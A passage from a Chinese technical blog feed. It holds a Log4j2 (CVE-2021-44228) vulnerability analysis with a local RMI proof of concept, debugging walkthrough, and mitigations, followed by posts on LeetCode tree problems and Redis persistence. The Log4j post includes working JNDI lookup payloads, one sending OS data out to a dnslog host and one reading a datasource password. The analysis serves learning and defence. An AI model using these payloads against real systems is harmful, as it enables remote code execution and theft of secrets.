    <content type="html"><![CDATA[<p>很久之前分析过了，今天形成博客，顺带写了一个工具Demo</p><span id="more"></span><h2 id="Log4j2漏洞原理分析"><a href="#Log4j2漏洞原理分析" class="headerlink" title="Log4j2漏洞原理分析"></a>Log4j2漏洞原理分析</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><a href="https://www.cnblogs.com/fdxsec/p/17793755.html">参考文章</a></p><p>Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。</p><p>漏洞适应版本：2.0 &lt;= Apache log4j2 &lt;=2.14.1。jdk8u65。CVE-2021-44228</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h4><p>​log4j2是apache下的java应用常见的开源日志库，就是一个日志记录工具，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息</p><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>​JNDI，全称为<strong>Java命名和目录接口</strong>（Java Naming and Directory Interface）,是SUN公司提供的一种标准的Java命名系统接口，<strong>允许从指定的远程服务器获取并加载对象</strong>。<strong>JNDI相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</strong></p><p>​其实就是可以让Java应用程序可以向远程服务器获取资源的接口，这也是这次利用的关键点，利用时常用的有RMI和LDAP两种服务。</p><h3 id="Java低版本原理"><a href="#Java低版本原理" class="headerlink" title="Java低版本原理"></a>Java低版本原理</h3><h4 id="原理描述"><a href="#原理描述" class="headerlink" title="原理描述"></a>原理描述</h4><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121944757">参考文章</a></p><p>​Log4j2漏洞总的来说就是：因为Log4j2<strong>默认支持解析ldap/rmi协议</strong>（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。</p><p>​这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p>首先我们编写一个测试代码调试一下漏洞是如何形成的：</p><p>RMIServer类：用于开启RMI服务，托管我们的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String [] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException {<br>        <span class="hljs-comment">//启动rmi服务 端口为1099</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br>        <span class="hljs-comment">//创建资源为本机目录的HackingObj类，其中null代表本机目录，也可以指定服务器，如127.0.0.1:80绑定为本机nginx下资源</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">"rmi.HackingObj"</span>, <span class="hljs-string">"rmi.HackingObj"</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        <span class="hljs-comment">//绑定资源</span><br>        registry.bind(<span class="hljs-string">"3xsh0re"</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">"RMI服务初始化成功!"</span>);<br>    }<br>}<br></code></pre></td></tr></table></figure><p>HackingObj类：恶意代码类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HackingObj</span> {<br>    <span class="hljs-keyword">static</span> {<br>        System.out.println(<span class="hljs-string">"Hacking!"</span>);<br>        <span class="hljs-keyword">try</span> {<br>            Runtime.getRuntime().exec(<span class="hljs-string">"calc"</span>);<br>        }<span class="hljs-keyword">catch</span> (IOException e) {<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        }<br>    }<br>}<br></code></pre></td></tr></table></figure><p>上面的都是攻击者构造的。</p><p>测试类：用于测试Log4j2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">"${jndi:rmi://127.0.0.1/3xsh0re}"</span>;<br>        logger.error(<span class="hljs-string">"run {}"</span>,payload);<br>    }<br>}<br></code></pre></td></tr></table></figure><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>下面打断点调试漏洞路径：先打一个初始断点</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707233903961.png" class="" title="image-20240707233903961"><p>首先步进调试到下面的位置，发现在ReusableParameterizedMessage中调用了set函数，其实就是在初始化日志的格式</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708103123177.png" class="" title="image-20240708103123177"><p>可以发现这里初始化中的paramArray参数就是我们的payload</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708103609288.png" class="" title="image-20240708103609288"><p>以上完成了初始化。</p><p>ReusableLogEventFactory中createEvent函数（34行）进行了日志事件的初始化，也就是后面的event变量。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708105306091.png" class="" title="image-20240708105306091"><p>后面进入了LoggerConfig中的callAppender函数，然后这里的函数调用我就不贴图了：调用到AppenderControl中的tryCallAppender，然后调用AbstractOutputStreamAppender中的Append-&gt;tryAppend-&gt;directEncodeEvent。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708105456534.png" class="" title="image-20240708105456534"><p>在这之后调用了PatternLayout中的encode函数，可以发现调用了toText函数，继续跟进</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708110302291.png" class="" title="image-20240708110302291"><p>进入PatternLayout的toText函数，然后调用了序列化函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707223506436.png" class="" title="image-20240707223506436"><p>在toSerializable函数中，调用format函数，并将当前event和待处理字符串传入</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708110821531.png" class="" title="image-20240708110821531"><p>调试到PatternFormatter中的format函数发现此时在格式化需要打印的日志，可以发现在进行格式化的时候有两个参数，一个buf作为输出的缓冲。<strong>值得注意的是，这里调用了不同的converter的format函数。</strong></p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707235601603.png" class="" title="image-20240707235601603"><p>比如处理日期：调用的是DatePatternConverter的format函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708111850828.png" class="" title="image-20240708111850828"><p>处理字符串，当前的format函数进而调用了LiteralPatternConverter中的format函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708111114357.png" class="" title="image-20240708111114357"><p>继续调试，输入<code>${jndi:rmi://127.0.0.1/3xsh0re}</code>对应的是<code>%msg</code>，处理的converter是<code>MessagePatternConverter</code>，跟进它的format()。发现在MessagePatternConverter（第102行）中调用了另一个格式化方法，专门解析字符串<code>${}</code>，这里如果msg中存在<code>${</code>字符串，取出msg值后，就将整个msg字符串从<code>workingBuilder</code>中替换掉。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707223343811.png" class=""><p>先触发了replace函数，这里如果source也就是我们的payload不为空的话，将会调用substitute函数。那么substitute函数是干什么的呢。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708134537990.png" class="" title="image-20240708134537990"><p>我们继续看StrSubstitutor中的substitute函数，这里调用了另一个返回值为int的重构函数，稍微看一段这段代码，可以发现这个函数实际上是在递归的解析<code>${}</code>，直到将被包括的内容取出来。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708135153387.png" class="" title="image-20240708135153387"><p>同样的，在这个substitute函数中，递归解析完成了，会调用resolveVariable (第418行)去触发了JndiLookup函数，加载字符串中的内容</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707230109954.png" class=""><p>这里调用了StrLookup的lookup函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707231739578.png" class=""><p>这是一个接口类，根据不同的事件去匹配不同的实现，这里实现了JndiLookup接口。其实这里可以发现支持了很多的Lookup函数，说明可以解析的参数还有很多。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取java运行时版本，jvm版本，和操作系统版本</span><br><span class="hljs-string">"${java:runtime} ${java:vm} ${java:os}"</span><br><span class="hljs-string">"${sys:java.version}"</span><br><br><span class="hljs-comment">//外带数据:</span><br><span class="hljs-string">"${jndi:ldap://${java:os}.dkfjlsd.dnslog.cn}"</span><br><br><span class="hljs-comment">//还可利用Bundle协议读取项目配置文件来获取敏感信息。</span><br><span class="hljs-string">"${bundle:application:spring.datasource.password}"</span><br></code></pre></td></tr></table></figure><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707231833038.png" class=""><p>这里调用JndiLookup中的convertJndiName去处理我们的路径，得到要加载类的地址</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707230247931.png" class=""><p>然后调用了JndiManager</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707232102120.png" class=""><p>使用JndiManager的lookup函数，然后这个lookup函数最终调用了java原生的lookup函数，导致反序列化远程加载恶意类。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707230813761.png" class=""><p>到此，低版本Java的分析完了。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708112758092.png" class="" title="image-20240708112758092"><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ol><li>升级到最新版</li><li>临时修改方法:<ul><li>jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（版本&gt;=2.10.0有效）</li><li>设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true （版本&gt;=2.10.0有效）</li><li>log4j2 &lt; 2.10以下的版本移除JndiLookup类。</li></ul></li><li>禁止没有必要的业务访问外网</li></ol><p><a href="https://github.com/3xsh0re/Log4j2Exploiter">附上我的利用工具Demo</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode114认识二叉树的前驱节点</title>
    <link href="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/"/>
    <url>/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>前驱节点？</p><span id="more"></span><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你二叉树的根结点 <code>root</code> ，请你将它展开为一个单链表：</p><ul><li>展开后的单链表应该同样使用 <code>TreeNode</code> ，其中 <code>right</code> 子指针指向链表中下一个结点，而左子指针始终为 <code>null</code> 。</li><li>展开后的单链表应该与二叉树 <a href="https://baike.baidu.com/item/%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86/6442839?fr=aladdin"><strong>先序遍历</strong></a> 顺序相同。</li></ul><p>这道题一开始做的时候开了一个数组存了前序遍历的结果，然后对数组操作解题。做是做出来了，但感觉中等题应该有比较巧妙的思路解题。于是去看了题解，学习到了前驱节点这个概念。</p><h3 id="前驱与后继"><a href="#前驱与后继" class="headerlink" title="前驱与后继"></a>前驱与后继</h3><p><strong>一个节点的前驱节点，也就是中序遍历中该节点的前一个节点。</strong>举个例子：</p><img src="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/Snipaste_2024-06-06_16-42-24.png" class=""><p>中序遍历的顺序为：1，2，4，5，7，8，9，11</p><p>那么7的前驱节点为5，8的前驱节点为7</p><p>分析一下就可以看出，5其实是7的左子树的最右下的节点，也是中序遍历左子的最后一个节点</p><p><strong>一个节点的后继节点，也就是中序遍历中该节点的后一个节点</strong></p><p>那么7的后继节点为8，8的后继节点为9</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>学习到了前驱节点，再看这道题，可以发现，要按照前序遍历的结果形成链表，就是要把<strong>访问到的当前节点的右子树接到当前节点的前驱节点上</strong>。</p><img src="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/Snipaste_2024-06-06_16-53-05.png" class=""><p>那我做题的思路可以转变到：遍历节点，判断该节点的左子节点<code>lnode</code>是否存在，如果存在，取出这个左子树的最右下的节点，这个节点就是当前节点的前驱节点<code>pnode</code>，然后将当前遍历节点的右子节点<code>rnode</code>接到<code>pnode</code>上。做完上面的操作后，将该节点的右子树指针赋值为左子树指针，并将左子树指针置空。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">flatten</span><span class="hljs-params">(TreeNode* root)</span> </span>{<br>        TreeNode *current = root;<br>        <span class="hljs-keyword">while</span>(current!=<span class="hljs-literal">nullptr</span>)<br>        {<br>            <span class="hljs-comment">// 判断左子树是否为空</span><br>            <span class="hljs-keyword">if</span> (current-&gt;left!=<span class="hljs-literal">nullptr</span>)<br>            {<br>                TreeNode *lnode = current-&gt;left;<br>                <span class="hljs-comment">// 前驱节点</span><br>                TreeNode *pnode = lnode;<br>                <span class="hljs-keyword">while</span>(pnode-&gt;right!=<span class="hljs-literal">nullptr</span>) pnode = pnode-&gt;right;<br>                pnode-&gt;right = current-&gt;right;<br>                current-&gt;right = lnode;<br>                current-&gt;left  = <span class="hljs-literal">nullptr</span>;<br>            }<br>            current = current-&gt;right;<br>        }<br>    }<br>};<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis学习</title>
    <link href="/2024/06/05/Redis%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/06/05/Redis%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>之前写的项目里用过redis，但是没有专门学习过，现在系统学习一下。</p><span id="more"></span><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>redis是典型的非关系型数据库。以key-value形式存储。</p><p>NoSQL也有说法“Not Only SQL”。</p><p>优点：<strong>对数据高并发读写（内存操作）</strong>、<strong>单线程操作（原子性）</strong></p><p><strong>Redis为什么不用多线程？</strong></p><p>Redis并没有采用多线程的方式来提高性能，而是采用了<strong>单线程+异步IO</strong>模型</p><ol><li>单线程模型避免了多线程的上下文切换开销</li><li>多线程需要增加锁机制，增加系统的复杂性和开销，和redis的设计理念不符</li><li>Redis使用事件驱动模型，在单个线程中通过IO多路复用技术同时监听多个IO事件，并在事件发生时进行处理</li></ol><p><strong>场景设计：热点事件，某个网页点击量短时间内飙升</strong></p><p>将数据缓存在redis中，前端访问时，直接从内存中查数据；等到请求量下降时，再将点击量等等数据同步到关系型数据库中。保持数据的最终一致性即可。</p><h2 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h2><p>事务相当于执行批量的redis操作命令，事务的操作不是原子性的，当中间的操作出错时，不会停止执行命令，也不会回滚到出错前的状态。</p><h2 id="Redis持久化机制"><a href="#Redis持久化机制" class="headerlink" title="Redis持久化机制"></a>Redis持久化机制</h2><p>Redis不定时的将数据持久到硬盘中，Redis启动时，会提前将硬盘中的数据加载到内存。</p><h3 id="RDB方式"><a href="#RDB方式" class="headerlink" title="RDB方式"></a>RDB方式</h3><p>快照方式，将内存数据以快照方式写入到二进制文件中(dump.rdb)。触发RDB持久化过程分为手动触发和自动触发。</p><p>触发机制：</p><h4 id="手动触发："><a href="#手动触发：" class="headerlink" title="手动触发："></a>手动触发：</h4><ol><li>save命令：<strong>会阻塞当前Redis服务器，无法接收其他请求</strong>，如果内存中数据较多，会造成长时间的阻塞，不建议在生产环境中使用</li><li>bgsave命令：<strong>异步操作，不会阻塞主进程</strong>。redis执行fork指令开启一个子进程，由子进程实现RDB持久化。</li></ol><p><strong>bgsave命令就一定不会阻塞主进程吗？</strong></p><p>不一定，bgsave命令中，fork子进程这个操作是同步的，如果fork一个子进程花费时间太久（一般很快），basave命令仍然有阻塞其他客户的请求的可能。</p><h4 id="自动触发："><a href="#自动触发：" class="headerlink" title="自动触发："></a>自动触发：</h4><p>使用save相关配置：save m n，表示m秒内数据集存在n次修改时会自动触发bgsave命令。</p><ul><li>优点：压缩紧凑的二进制文件，使用于备份、全量复制等场景。开发中可以按照每6小时执行一次bgsave备份。</li><li>缺点：RDB无法做到实时持久化，每次bgsave时都需要fork子进程，消耗时间</li></ul><h3 id="AOF方式"><a href="#AOF方式" class="headerlink" title="AOF方式"></a>AOF方式</h3><p><code>AOF(Append-only file)</code></p><p>与RDB存储某个时刻的快照不同，AOF持久化方式会记录客户端对服务器的每一次写操作命令，并将这些写操作以Redis协议追加保存到以后缀为aof文件末尾，在Redis服务器重启时，会加载并运行aof文件的命令，以达到恢复数据的目的。</p><p>Redis默认不开启AOF持久化方式，我们可以在配置文件中开启并进行更加详细的配置，如下面的redis.conf文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开启aof机制</span><br>appendonly <span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># aof文件名</span><br>appendfilename <span class="hljs-string">"appendonly.aof"</span><br><br><span class="hljs-comment"># 写入策略,always表示每个写操作都保存到aof文件中,也可以是everysec或no</span><br>appendfsync always<br><br><span class="hljs-comment"># 默认不重写aof文件</span><br>no-appendfsync-on-rewrite no<br><br><span class="hljs-comment"># 保存目录</span><br><span class="hljs-built_in">dir</span> ~/redis/<br></code></pre></td></tr></table></figure><h4 id="三种写入策略"><a href="#三种写入策略" class="headerlink" title="三种写入策略"></a>三种写入策略</h4><ol><li>always：保存每一个写操作，很安全也很慢，因为写文件需要进行IO操作</li><li>everysec：默认写入策略，每秒写入一次AOF文件，所以最多刚要写入就宕机，最多丢失1s数据</li><li>no：交给OS来处理，最快，最不安全。</li></ol><h4 id="AOF文件重写"><a href="#AOF文件重写" class="headerlink" title="AOF文件重写"></a>AOF文件重写</h4><p>AOF将客户端的每一个写操作都追加到aof文件末尾，比如对一个key多次执行incr命令，这时候，aof保存每一次命令到aof文件中，aof文件会变得非常大。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">incr num 1<br>incr num 2<br>incr num 3<br>incr num 4<br>incr num 5<br>incr num 6<br>...<br>incr num 100000<br></code></pre></td></tr></table></figure><p>aof文件太大，加载aof文件恢复数据时，就会非常慢，为了解决这个问题，Redis支持aof文件重写，通过重写aof，可以生成一个恢复当前数据的最少命令集，比如上面的例子中那么多条命令，可以重写为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> num <span class="hljs-number">100000</span><br></code></pre></td></tr></table></figure><p>aof文件是一个二进制文件，并不是像上面的例子一样，直接保存每个命令，而使用Redis自己的格式，上面只是方便演示。</p><p><strong>AOF重写方式也是异步操作，即如果要写入aof文件，则Redis主进程会forks一个子进程来处理</strong></p><h4 id="重写AOF文件的好处"><a href="#重写AOF文件的好处" class="headerlink" title="重写AOF文件的好处"></a>重写AOF文件的好处</h4><ul><li>压缩aof文件，减少磁盘占用量。</li><li>将aof的命令压缩为最小命令集，加快了数据恢复的速度。</li></ul><h3 id="混合持久化"><a href="#混合持久化" class="headerlink" title="混合持久化"></a>混合持久化</h3><p>混合持久化是Redis 4.0之后新增的方式，结合了RDB和AOF的优点。</p><ul><li>在写入的时候，先把当前数据以RDB形式写入文件的开头，再将后续的操作命令以AOF的格式存入文件。这样既能保证Redis重启时的速度，又能降低数据丢失的风险。</li><li>混合持久化的缺点是，在Redis重启时需要同时处理两个文件（RDB文件和AOF文件），可能会比单一持久化机制的恢复速度慢。</li></ul><p>混合模式兼并了RDB重启后的快速恢复能力和AOF丢失数据风险低的能力，具体操作流程如下：</p><ol><li>子进程会通过<code>BGSAVE </code>写入AOF中</li><li>触发<code>BGREWRITEAOF</code>后，会将AOF写入到文件</li><li>将含有RDB和AOF的数据覆盖旧的AOF文件（这时AOF文件一半为RDB，一半为AOF）</li></ol><h4 id="AOF重写和RDB持久化的冲突"><a href="#AOF重写和RDB持久化的冲突" class="headerlink" title="AOF重写和RDB持久化的冲突"></a>AOF重写和RDB持久化的冲突</h4><p>在Redis中，AOF重写和RDB持久化可能会同时发生，这会导致一些冲突和问题。例如：</p><ul><li>AOF重写和RDB持久化都需要fork子进程，如果两个子进程同时存在，会增加内存的消耗和系统的负载。</li><li>AOF重写和RDB持久化都需要写入磁盘，如果两个文件同时写入，会增加磁盘的压力和IO的开销。</li><li>AOF重写和RDB持久化都需要在完成后通知主进程，如果两个信号同时到达，可能会造成信号丢失或者处理错误。</li></ul><p>为了解决这些冲突和问题，Redis采用了以下策略：</p><ul><li><strong>如果AOF重写和RDB持久化同时被触发，那么只有一个子进程会被创建，优先执行RDB持久化，然后再执行AOF重写。</strong>这样可以避免同时存在两个子进程的情况。</li><li>如果AOF重写正在进行，而此时又收到了RDB持久化的请求，那么RDB持久化会被延迟到AOF重写完成后再执行。这样可以避免同时写入两个文件的情况。</li><li>如果AOF重写和RDB持久化都完成了，那么主进程会先处理RDB持久化的信号，然后再处理AOF重写的信号。这样可以避免信号丢失或者处理错误的情况。</li></ul><p>总之，Redis通过优先级、延迟和顺序等方式来协调AOF重写和RDB持久化的冲突和问题，保证了数据的完整性和一致性，下图为简要说明。</p><table><thead><tr><th>场景</th><th>策略</th></tr></thead><tbody><tr><td>AOF重写与RDB持久化同时被触发</td><td>优先RDB</td></tr><tr><td>AOF重写正在进行</td><td>优先AOF</td></tr><tr><td>AOF重写和RDB持久化都完成</td><td>优先RDB</td></tr></tbody></table><h3 id="三种模式的选择建议"><a href="#三种模式的选择建议" class="headerlink" title="三种模式的选择建议"></a>三种模式的选择建议</h3><p>具体的选择建议如下：</p><ul><li>如果对数据完整性要求不高，可以只使用RDB，或者将AOF的同步频率设置为每秒一次</li><li>如果想让数据尽可能不丢失，可以只使用AOF，并将AOF的同步频率设置为每次写入操作都同步</li><li>如果对数据完整性和性能都有要求，可以同时使用AOF和RDB，并将AOF的同步频率设置为每秒一次。这样既可以保证数据的安全性，又可以利用RDB进行快速的数据恢复</li><li>如果既想节省磁盘空间，又想提高数据恢复速度，可以只使用RDB，并适当调整RDB的快照频率</li></ul><h2 id="Redis内存淘汰机制"><a href="#Redis内存淘汰机制" class="headerlink" title="Redis内存淘汰机制"></a>Redis内存淘汰机制</h2>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后端开发</tag>
      
      <tag>Redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode117复习二叉树的层序遍历</title>
    <link href="/2024/06/05/leetcode117%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"/>
    <url>/2024/06/05/leetcode117%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<p>刷到了leetcode117，通过层序遍历做出来的，顺便就复习一下二叉树的层序遍历。</p><span id="more"></span><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/">题目链接</a></p><p>根据题意，我们需要将每个节点的<code>next</code>指针指向在树中这个节点右边的那个节点，所以很显然，这道题是层序遍历节点，在某一层中，才能找到树中某个节点的右边节点。</p><p>可以写出如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 